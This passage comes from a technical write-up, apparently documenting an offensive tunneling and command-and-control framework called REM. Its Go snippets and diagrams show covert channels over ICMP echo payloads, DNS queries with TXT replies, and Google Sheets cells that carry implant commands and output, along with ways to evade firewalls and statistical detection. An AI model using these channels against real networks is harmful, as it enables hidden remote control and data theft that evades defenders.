<div class="highlight"><pre><span></span><code><span class="c1">// Golang standard library net.PacketConn interface</span>
<span class="kd">type</span><span class="w"> </span><span class="nx">PacketConn</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">ReadFrom</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Addr</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">   </span><span class="c1">// Read data packet</span>
<span class="w">    </span><span class="nx">WriteTo</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Addr</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w">    </span><span class="c1">// Send data packet</span>
<span class="w">    </span><span class="nx">Close</span><span class="p">()</span><span class="w"> </span><span class="kt">error</span><span class="w">                                          </span><span class="c1">// Close connection</span>
<span class="w">    </span><span class="c1">// ... plus auxiliary methods like address, timeout, etc.</span>
<span class="p">}</span>
</code></pre></div>
<p><strong>Difference from <code>net.Conn</code>:</strong></p>
<ul>
<li><strong>net.Conn:</strong> Stream connection; data is transmitted as a byte stream with boundary concepts (e.g., TCP).</li>
<li><strong>net.PacketConn:</strong> Packet connection; each read/write is a complete packet, unordered and liable to be lost (e.g., UDP).</li>
</ul>
<p><strong>Encapsulation Methods for Various Protocols:</strong></p>
<ul>
<li><strong>ICMP Packet:</strong> Uses the sending/receiving of ping packets as <code>PacketConn</code> data exchange.</li>
<li><strong>HTTP API Call:</strong> Simulates <code>PacketConn</code> communication via sending HTTP requests and receiving responses.</li>
<li><strong>WebShell Command Execution:</strong> Simulates <code>PacketConn</code> communication via command input and echo output.</li>
<li><strong>DNS Query:</strong> Simulates <code>PacketConn</code> communication via DNS query requests and responses.</li>
<li><strong>Social Media API:</strong> Simulates <code>PacketConn</code> communication via data exchange in comments, posts, etc.</li>
</ul>
<p>Simplex Interface Abstraction:</p>
<p>After providing the intermediate layer to encapsulate arbitrary data exchange protocols as PacketConn, we need to transform PacketConn into a streamed duplex channel via some conversion, rather than just single data packets (where the limit of a single packet would just be a C2 heartbeat channel).</p>
<p>We implemented the conversion from <code>PacketConn</code> to <code>io.ReadWriteCloser</code> by adding <code>Send</code>, <code>Receive</code>, and a <code>polling</code> mechanism. Just like the operation in the Tunnel layer in 2.1.1, we performed a similar operation in the Simplex layer, but with a different purpose: <strong>Transforming PacketConn into <code>io.ReadWriteCloser</code> via polling.</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// Simplex Interface: Unified Bidirectional Data Exchange Abstraction</span>
<span class="kd">type</span><span class="w"> </span><span class="nx">Simplex</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Send</span><span class="p">(</span><span class="nx">pkts</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexPackets</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexAddr</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Receive</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="nx">pkts</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexPacket</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexAddr</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Close</span><span class="p">()</span><span class="w"> </span><span class="kt">error</span>
<span class="p">}</span>
</code></pre></div>
<p>Three Polling Modes:</p>
<p>Simplex simulates duplex transmission via polling mechanisms, choosing different strategies based on channel characteristics:</p>
<p><strong>Mode 1: Client Polling (Most Common)</strong></p>
<ul>
<li><em>Applicable Scenario:</em> Channels where only the client can initiate requests (HTTP API, WebShell, Google Sheets).</li>
<li><em>Mechanism:</em> The client periodically polls the server to check for new data.</li>
<li><em>Typical Applications:</em><ul>
<li>HTTP API: <code>GET /poll</code> to periodically retrieve pending commands.</li>
<li>Google Sheets: Client periodically reads Column A to get commands.</li>
<li>WebShell: Client periodically sends special requests to retrieve data cached by the server.</li>
</ul>
</li>
</ul>
<p><strong>Mode 2: Server Polling (Reverse Channel)</strong></p>
<ul>
<li><em>Applicable Scenario:</em> Certain special channels allow the server to actively read client data.</li>
<li><em>Mechanism:</em> The server periodically checks a shared storage location to read data written by the client.</li>
<li><em>Typical Applications:</em><ul>
<li>File Sharing System: Server monitors a specific directory and reads files uploaded by the client.</li>
<li>Message Queue: Server subscribes to a specific topic and receives messages published by the client.</li>
</ul>
</li>
</ul>
<p><strong>Mode 3: Bidirectional Polling (Symmetric Channel)</strong></p>
<ul>
<li><em>Applicable Scenario:</em> Neither side can actively push; data exchange is only possible via shared storage.</li>
<li><em>Mechanism:</em> Both client and server periodically poll shared storage to read data written by the other party.</li>
<li><em>TypicalApplications:</em><ul>
<li>Google Sheets Bidirectional: Client polls Column A (Command Input), Server polls Column B (Command Output).</li>
<li>Cloud Storage Channel: Both sides monitor specified files or object storage locations.</li>
</ul>
</li>
</ul>
<p>Through the <code>Simplex</code> interface, any data exchange medium (unidirectional, bidirectional, symmetric, asymmetric) is encapsulated into a unified <code>PacketConn</code> interface, providing standardized input for the next step of ARQ reliability conversion.</p>
<p>Case 1: ICMP Covert Channel Implementation Details</p>
<p>The core value of the ICMP protocol lies in bypassing firewall restrictions. Traditional firewalls usually allow ICMP Echo (ping) traffic to pass. REM utilizes this feature to hide attack data in the payload of ICMP packets:</p>
<div class="highlight"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">*</span><span class="nx">icmpConn</span><span class="p">)</span><span class="w"> </span><span class="nx">WriteTo</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Addr</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Construct ICMP Echo message, attack payload hidden in Data field</span>
<span class="w">    </span><span class="nx">m</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">icmp</span><span class="p">.</span><span class="nx">Message</span><span class="p">{</span>
<span class="w">        </span><span class="nx">Type</span><span class="p">:</span><span class="w"> </span><span class="nx">msgType</span><span class="p">,</span><span class="w">  </span><span class="c1">// ICMP Echo Request/Reply</span>
<span class="w">        </span><span class="nx">Body</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">icmp</span><span class="p">.</span><span class="nx">Echo</span><span class="p">{</span>
<span class="w">            </span><span class="nx">ID</span><span class="p">:</span><span class="w"> </span><span class="nx">remoteID</span><span class="p">,</span><span class="w">    </span><span class="c1">// Session ID</span>
<span class="w">            </span><span class="nx">Seq</span><span class="p">:</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="nx">seq</span><span class="p">),</span><span class="w">   </span><span class="c1">// Sequence Number</span>
<span class="w">            </span><span class="nx">Data</span><span class="p">:</span><span class="w"> </span><span class="nx">data</span><span class="p">,</span><span class="w">      </span><span class="c1">// Attack data hidden here</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Serialize ICMP message</span>
<span class="w">    </span><span class="nx">wb</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">(</span><span class="kc">nil</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Send raw ICMP packet</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">conn</span><span class="p">.</span><span class="nx">WriteTo</span><span class="p">(</span><span class="nx">wb</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div>
<p><em>Key Technical Points:</em></p>
<ul>
<li><strong>Raw Socket:</strong> Uses <code>golang.org/x/net/icmp</code> to construct ICMP packets directly, bypassing OS ICMP processing.</li>
<li><strong>Sequence Management:</strong> Uses the <code>Seq</code> field to identify different packets, supporting concurrent transmission.</li>
<li><strong>Session Isolation:</strong> Uses the <code>ID</code> field to distinguish different sessions, supporting multiple connections reusing the same ICMP channel.</li>
</ul>
<p>Case 2: DNS Covert Channel Implementation Details</p>
<p>The covert value of the DNS protocol is even higher—DNS traffic is rarely blocked even in strict network environments. REM achieves bidirectional data transmission through DNS queries and responses:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Send data: Encode data into the domain name of the DNS query</span>
<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">*</span><span class="nx">dnsClient</span><span class="p">)</span><span class="w"> </span><span class="nx">Send</span><span class="p">(</span><span class="nx">pkts</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexPackets</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexAddr</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Base58 encoding to avoid characters not supported by DNS</span>
<span class="w">    </span><span class="nx">encoded</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">base58</span><span class="p">.</span><span class="nx">Encode</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>

<span class="w">    </span><span class="c1">// DNS label length limit is 63 bytes, segmentation required</span>
<span class="w">    </span><span class="c1">// Full domain name limit is 253 bytes</span>
<span class="w">    </span><span class="nx">labels</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">splitToLabels</span><span class="p">(</span><span class="nx">encoded</span><span class="p">,</span><span class="w"> </span><span class="mi">63</span><span class="p">)</span>

<span class="w">    </span><span class="c1">// Construct DNS query: data1.data2.data3.yourdomain.com</span>
<span class="w">    </span><span class="nx">domain</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Join</span><span class="p">(</span><span class="nx">labels</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">domain</span>

<span class="w">    </span><span class="c1">// Send DNS query</span>
<span class="w">    </span><span class="nx">msg</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">dns</span><span class="p">.</span><span class="nx">Msg</span><span class="p">{}</span>
<span class="w">    </span><span class="nx">msg</span><span class="p">.</span><span class="nx">SetQuestion</span><span class="p">(</span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">dns</span><span class="p">.</span><span class="nx">TypeTXT</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">client</span><span class="p">.</span><span class="nx">Exchange</span><span class="p">(</span><span class="nx">msg</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">server</span><span class="p">)</span>
<span class="p">}</span>

<span class="c1">// Receive data: Extract data from the TXT record of the DNS response</span>
<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="o">*</span><span class="nx">dnsServer</span><span class="p">)</span><span class="w"> </span><span class="nx">Receive</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="nx">pkts</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexPacket</span><span class="p">,</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">*</span><span class="nx">SimplexAddr</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Parse DNS query</span>
<span class="w">    </span><span class="nx">msg</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">parseDNSQuery</span><span class="p">()</span>

<span class="w">    </span><span class="c1">// Extract data from domain name</span>
<span class="w">    </span><span class="nx">labels</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Split</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">Question</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="nx">encoded</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Join</span><span class="p">(</span><span class="nx">labels</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="nx">labels</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">)</span>

<span class="w">    </span><span class="c1">// Base58 decode to get raw data</span>
<span class="w">    </span><span class="nx">data</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">base58</span><span class="p">.</span><span class="nx">Decode</span><span class="p">(</span><span class="nx">encoded</span><span class="p">)</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">SimplexPacket</span><span class="p">{</span><span class="nx">Data</span><span class="p">:</span><span class="w"> </span><span class="nx">data</span><span class="p">},</span><span class="w"> </span><span class="nx">addr</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>
</code></pre></div>
<p><em>DNS Channel Key Technologies:</em></p>
<ul>
<li><strong>Base58 Encoding:</strong> Avoids special characters unsupported by DNS and is shorter than Base64.</li>
<li><strong>Label Segmentation:</strong> DNS labels are limited to 63 bytes, full domains to 253 bytes; smart segmentation is required.</li>
<li><strong>TXT Records:</strong> Server responses use TXT records to transmit data (max 255 bytes per record).</li>
<li><strong>Query Aggregation:</strong> Multiple small packets can be merged into a single DNS query to improve efficiency.</li>
</ul>
<p>Case 3: Google Sheets Covert Channel Implementation Details</p>
<p>Google Sheets is a widely used online collaboration tool. By using Google Sheets API cells as a data exchange medium, traffic is completely hidden within legitimate office traffic:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Google Sheets Cell Layout Design</span>
<span class="kd">const</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="nx">sheetCommandCell</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;A&quot;</span><span class="w">  </span><span class="c1">// Column A: Command Input</span>
<span class="w">    </span><span class="nx">sheetOutputCell</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;B&quot;</span><span class="w">  </span><span class="c1">// Column B: Command Output</span>
<span class="w">    </span><span class="nx">sheetTimestamp</span><span class="w">   </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;C&quot;</span><span class="w">  </span><span class="c1">// Column C: Timestamp</span>
<span class="w">    </span><span class="nx">sheetTickerCell</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;E2&quot;</span><span class="w"> </span><span class="c1">// Cell E2: Polling Interval Configuration</span>
<span class="p">)</span>

<span class="c1">// Client Polling: Read command from Column A</span>
<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">g</span><span class="w"> </span><span class="o">*</span><span class="nx">GoogleClient</span><span class="p">)</span><span class="w"> </span><span class="nx">pullCommand</span><span class="p">(</span><span class="nx">rowIndex</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Read command from specified row in Column A</span>
<span class="w">    </span><span class="nx">readRange</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%s!%s%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">sheetName</span><span class="p">,</span><span class="w"> </span><span class="nx">sheetCommandCell</span><span class="p">,</span><span class="w"> </span><span class="nx">rowIndex</span><span class="p">)</span>

<span class="w">    </span><span class="nx">url</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span>
<span class="w">        </span><span class="s">&quot;https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">sheetID</span><span class="p">,</span><span class="w"> </span><span class="nx">readRange</span><span class="p">,</span>
<span class="w">    </span><span class="p">)</span>

<span class="w">    </span><span class="nx">resp</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">g</span><span class="p">.</span><span class="nx">client</span><span class="p">.</span><span class="nx">Get</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
<span class="w">    </span><span class="c1">// Parse JSON response to get command text</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">command</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>

<span class="c1">// Client Push: Write output to Columns B-C</span>
<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">g</span><span class="w"> </span><span class="o">*</span><span class="nx">GoogleClient</span><span class="p">)</span><span class="w"> </span><span class="nx">pushOutput</span><span class="p">(</span><span class="nx">rowIndex</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Write to Columns B-C (Output and Timestamp)</span>
<span class="w">    </span><span class="nx">writeRange</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%s!%s%d:%s%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">sheetName</span><span class="p">,</span>
<span class="w">        </span><span class="nx">sheetOutputCell</span><span class="p">,</span><span class="w"> </span><span class="nx">rowIndex</span><span class="p">,</span><span class="w"> </span><span class="nx">sheetTimestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">rowIndex</span><span class="p">)</span>

<span class="w">    </span><span class="nx">url</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span>
<span class="w">        </span><span class="s">&quot;https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s?valueInputOption=RAW&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">sheetID</span><span class="p">,</span><span class="w"> </span><span class="nx">writeRange</span><span class="p">,</span>
<span class="w">    </span><span class="p">)</span>

<span class="w">    </span><span class="c1">// Construct write data</span>
<span class="w">    </span><span class="nx">valueRange</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">ValueRange</span><span class="p">{</span>
<span class="w">        </span><span class="nx">Range</span><span class="p">:</span><span class="w">  </span><span class="nx">writeRange</span><span class="p">,</span>
<span class="w">        </span><span class="nx">Values</span><span class="p">:</span><span class="w"> </span><span class="p">[][]</span><span class="kd">interface</span><span class="p">{}{{</span><span class="nx">output</span><span class="p">,</span><span class="w"> </span><span class="nx">getCurrentTime</span><span class="p">()}},</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">body</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">json</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">(</span><span class="nx">valueRange</span><span class="p">)</span>
<span class="w">    </span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">NewRequest</span><span class="p">(</span><span class="s">&quot;PUT&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">body</span><span class="p">)))</span>
<span class="w">    </span><span class="nx">g</span><span class="p">.</span><span class="nx">client</span><span class="p">.</span><span class="nx">Do</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
<span class="p">}</span>
</code></pre></div>
<p><em>Google Sheets Channel Workflow:</em></p>
<div class="highlight"><pre><span></span><code>Client (Implant)          Google Sheets          Server (C2 Server)
  |                          |                          |
  |                          |&lt;--[1. Write A2: &quot;whoami&quot;]|
  |--[2. Poll Read A2]------&gt;|                          |
  |&lt;-[3. Return: &quot;whoami&quot;]---|                          |
  |                          |                          |
  |--[4. Write B2-C2]-------&gt;|                          |
  |   &quot;admin&quot; + timestamp    |                          |
  |                          |--[5. Read B2-C2]--------&gt;|
  |                          |                          |
</code></pre></div>
<p>The Google Sheets channel uses Service Account OAuth2 authentication to access spreadsheets. It implements bidirectional communication via column separation (Column A for command input, Columns B-C for output and timestamps) and uses the <code>batchGet</code> API to read multiple cell ranges at once to reduce request count. Cell E2 stores dynamic polling interval configuration, allowing remote adjustment of communication frequency. All operations strictly use the standard Sheets API, making the traffic characteristics indistinguishable from normal office operations.</p>
<p>Regardless of the underlying protocol, they are all encapsulated into the same <code>PacketConn</code> interface and achieve bidirectional communication capability via polling mechanisms, providing standardized input for the upper-layer ARQ protocol.</p>
<p>Simplex Interface and Duplexing Mechanism:</p>
<p>Many protocols (like HTTP API, WebShell, Google Sheets) are inherently unidirectional—only the client can initiate requests; the server cannot actively push data. The Simplex interface converts these unidirectional channels into bidirectional communication via unified Send/Receive abstraction and flexible polling mechanisms.</p>
<h4 id="222-arq-reliability-guarantee-and-interface-conversion-from-packetconn-to-conn">2.2.2 ARQ: Reliability Guarantee and Interface Conversion from PacketConn to Conn<a class="headerlink" href="#222-arq-reliability-guarantee-and-interface-conversion-from-packetconn-to-conn" title="Permanent link">&para;</a></h4>
<p>The <code>PacketConn</code> output by Simplex is bidirectional but unreliable. It requires an ARQ (Automatic Repeat reQuest) protocol to provide retransmission, ordering guarantees, and flow control mechanisms, finally converting it to a <code>net.Conn</code> interface for delivery to the Tunnel.</p>
<p>Traditional ARQ protocols (like KCP) are strongly coupled with specific transport protocols, limiting application scenarios. REM implements the decoupling of ARQ protocols via <code>PacketConn</code> abstraction, allowing any ARQ implementation to work on any <code>PacketConn</code>.</p>
<p><strong>Decoupled Design of ARQ and PacketConn:</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// Decoupling ARQ Protocol from PacketConn</span>
<span class="kd">func</span><span class="w"> </span><span class="nx">NewARQSession</span><span class="p">(</span><span class="nx">pc</span><span class="w"> </span><span class="nx">PacketConn</span><span class="p">)</span><span class="w"> </span><span class="nx">net</span><span class="p">.</span><span class="nx">Conn</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// The ARQ protocol no longer cares if the underlying layer is UDP, ICMP, or DNS</span>
<span class="w">    </span><span class="c1">// It only sends/receives packets via the PacketConn interface</span>
<span class="w">    </span><span class="c1">// Finally outputs a standard net.Conn interface</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Any protocol implementing the <code>PacketConn</code> interface (UDP, ICMP, DNS, HTTP, etc.) can serve as the transport layer for ARQ.</li>
<li>The ARQ protocol can evolve independently, unrestricted by the underlying transport protocol.</li>
<li>Achieves complete decoupling of the reliable transport protocol from the underlying transport medium.</li>
</ul>
<p>Selectable Multi-ARQ Protocols:</p>
<p>REM supports arbitrary ARQ protocol implementations, selectable based on scenario requirements. We provide two default ARQ protocols:</p>
<ul>
<li><strong>KCP Protocol:</strong> Mature ARQ implementation providing fast retransmission and congestion control, suitable for low-latency scenarios.</li>
<li><strong>Custom ARQ:</strong> Lightweight implementation supporting NACK mechanisms and adaptive parameter adjustment, suitable for low-rate restricted environments.</li>
</ul>
<p>By decoupling the association between ARQ and <code>PacketConn</code>, users can choose the most suitable ARQ protocol based on network environments (latency, packet loss rate, bandwidth), or even implement custom ARQ algorithms.</p>
<p>Further Control of Statistical Characteristics:</p>
<p>The ARQ layer provides additional capabilities for statistical countermeasures. By adjusting ARQ parameters (retransmission interval, window size, timeout duration, etc.), one can alter traffic timing characteristics and packet size distribution, making it harder for statistical analysis to identify. For instance, randomizing retransmission delays and dynamically adjusting window sizes can break the predictable patterns of traditional ARQ protocols.</p>
<h4 id="223-final-output-netconn-with-equal-status-to-tcp">2.2.3 Final Output: <code>net.Conn</code> with Equal Status to TCP<a class="headerlink" href="#223-final-output-netconn-with-equal-status-to-tcp" title="Permanent link">&para;</a></h4>
<p>After Simplex duplexing and ARQ reliability guarantees, the originally inferior protocols are finally output as standard <code>net.Conn</code> interfaces, gaining the exact same status and capabilities as TCP/UDP at the Tunnel level.</p>
<p><strong>Capabilities of Standard <code>net.Conn</code>:</strong></p>
<div class="highlight"><pre><span></span><code><span class="kd">type</span><span class="w"> </span><span class="nx">Conn</span><span class="w"> </span><span class="kd">interface</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Read</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Write</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">n</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Close</span><span class="p">()</span><span class="w"> </span><span class="kt">error</span>
<span class="p">}</span>
</code></pre></div>
<p><strong>Complete Conversion Link:</strong></p>
<p>Plaintext</p>
<div class="highlight"><pre><span></span><code>Inferior Protocol (ICMP/HTTP/WebShell/DNS/lolc2)
    ↓ [Simplex: Encapsulate as PacketConn + Duplexing]
Bidirectional PacketConn (Stateless Packet Interface)
    ↓ [ARQ: Reliability Guarantee + Interface Conversion]
Standard net.Conn
    ↓ [Delivered to Tunnel in Section 2.1]
Equal Status to TCP/UDP
</code></pre></div>
<p>Through this conversion mechanism, REM achieves true protocol equality:</p>
<ul>
<li>
<p><strong>Completely Isolated:</strong> Establish a reliable connection via WebShell, supporting proxying, tunneling, and forwarding.</p>
</li>
<li>
<p><strong>HTTP Only:</strong> Establish a full TCP connection via HTTP API, supporting any upper-layer protocol.</p>
</li>
<li>
<p><strong>DNS Only:</strong> Establish a covert tunnel via DNS queries, supporting data transmission.</p>
</li>
<li>
<p><strong>Allowlist IP/Domain Only:</strong> Establish a reliable connection via <code>lolc2</code>.</p>
</li>
<li>
<p>...and so on.</p>
</li>
</ul>
<p><em>(In the OSI model, this involves raw packet construction at the physical layer, data frame encapsulation at the data link layer, and reliability guarantee mechanisms at the transport layer.)</em></p>
<p>We have achieved a transport layer capable of full-duplex communication using arbitrary data exchange through the designs in 2.1 and 2.2. But does it end here?</p>
<h3 id="23-above-the-transport-layer-inverted-session-and-presentation-layers">2.3 Above the Transport Layer: Inverted Session and Presentation Layers<a class="headerlink" href="#23-above-the-transport-layer-inverted-session-and-presentation-layers" title="Permanent link">&para;</a></h3>
